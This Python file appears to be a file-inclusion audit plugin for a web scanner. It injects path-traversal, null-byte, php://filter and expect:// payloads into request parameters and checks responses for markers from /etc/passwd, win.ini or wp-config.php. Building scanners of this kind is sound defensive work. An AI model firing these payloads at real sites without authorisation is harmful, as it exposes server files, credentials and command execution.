"""Local File Inclusion (LFI) audit plugin.

Detects path traversal, null byte injection, PHP wrapper abuse,
and blind LFI via timing or error analysis. Tests GET and POST params.
"""

from __future__ import annotations

import asyncio
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine
from xfweb.core.data.parsers.param_extractor import extract_params

logger = structlog.get_logger()

LFI_PAYLOADS = [
    ("../../etc/passwd", ["root:", "/bin/bash", "/bin/sh"]),
    ("../../etc/passwd%00", ["root:"]),
    ("....//....//etc/passwd", ["root:"]),
    ("/etc/passwd", ["root:"]),
    ("..%2f..%2f..%2fetc/passwd", ["root:"]),
    ("..%252f..%252f..%252fetc/passwd", ["root:"]),
    ("php://filter/convert.base64-encode/resource=/etc/passwd", ["cm9vd"]),
    ("../../windows/system32/drivers/etc/hosts", ["localhost"]),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", ["localhost"]),
    ("....\\\\....\\\\etc\\passwd", ["root:"]),
    ("/etc/passwd%00.jpg", ["root:"]),
    ("..%00/..%00/etc/passwd", ["root:"]),
]

WIN_LFI_PAYLOADS = [
    ("../../windows/win.ini", ["[fonts]", "[extensions]"]),
    ("..\\..\\..\\windows\\win.ini", ["[fonts]"]),
    ("....//....//windows/win.ini", ["[fonts]"]),
]

PHP_WRAPPER_PAYLOADS = [
    ("php://filter/convert.base64-encode/resource=index.php", ["PGh0bWw", "aW5kZXgucGhw"]),
    ("php://filter/convert.base64-encode/resource=../wp-config.php", ["PD9waHA", "d3AtY29uZmlnLnBocA"]),
    ("expect://id", ["uid=", "gid="]),
]


class LfiPlugin(AuditPlugin):
    """Local File Inclusion vulnerability detector with path traversal, wrappers, and blind detection."""

    plugin_name = "lfi"
    brief_description = "Detect local file inclusion (LFI) vulnerabilities"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if not params:
            return

        baseline = await http.get(freq.url.raw_url)

        tasks = []
        for param_name, param_value in params.items():
            tasks.append(self._test_param(freq, param_name, param_value, http, baseline))
        await asyncio.gather(*tasks, return_exceptions=True)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        return extract_params(freq)

    async def _test_param(self, freq: Any, param: str, value: str, http: HttpEngine, baseline: Any) -> None:
        all_payloads = LFI_PAYLOADS + WIN_LFI_PAYLOADS + PHP_WRAPPER_PAYLOADS

        for payload, markers in all_payloads:
            resp = await self._inject(freq, param, payload, http)
            if resp.status_code == 0:
                continue

            if markers and resp.status_code in (200, 500) and any(marker in resp.text for marker in markers):
                self.report_finding(
                    name=f"Local File Inclusion ({param}) via path traversal",
                    severity="high",
                    url=freq.url.raw_url,
                    description=f"LFI vulnerability detected in parameter '{param}'. "
                    f"Payload successfully retrieved server-side file contents.",
                    parameter=param,
                    evidence=f"Payload: {payload}\nMatching markers: {[m for m in markers if m in resp.text]}\n"
                    f"Response excerpt: {resp.text[:300]}",
                    http_request={"method": freq.method, "url": freq.url.raw_url, "data": freq.post_data or ""},
                    http_response={"status": resp.status_code, "body_excerpt": resp.text[:500]},
                    remediation="Validate and sanitize file path parameters. "
                    "Use a whitelist of allowed files. Remove path traversal sequences. "
                    "Chroot/jail the web application process.",
                )
                return

            if not markers and resp.status_code == 200 and len(resp.body) > 0:
                error_indicators = ["no such file", "file not found", "failed to open", "fopen()"]
                body_lower = resp.text.lower()
                if not any(ind in body_lower for ind in error_indicators):
                    if abs(len(resp.body) - len(baseline.body)) > 50:
                        self.report_finding(
                            name=f"Potential blind LFI in '{param}'",
                            severity="medium",
                            url=freq.url.raw_url,
                            description=f"Potential blind LFI in parameter '{param}'. "
                            "Payload resulted in a different response size without error messages.",
                            parameter=param,
                            evidence=f"Payload: {payload}\nBaseline size: {len(baseline.body)}\n"
                            f"Payload size: {len(resp.body)}",
                            http_request={"method": freq.method, "url": freq.url.raw_url},
                            http_response={"status": resp.status_code},
                            remediation="Validate and sanitize file path parameters.",
                        )
                        return

    async def _inject(self, freq: Any, param: str, payload: str, http: HttpEngine) -> Any:
        if freq.method.upper() == "POST" and freq.post_data:
            new_data = freq.post_data.replace(f"{param}=", f"{param}={payload}")
            return await http.post(freq.url.raw_url, data=new_data)
        else:
            new_url = freq.url.raw_url.replace(f"{param}=", f"{param}={payload}")
            return await http.get(new_url)
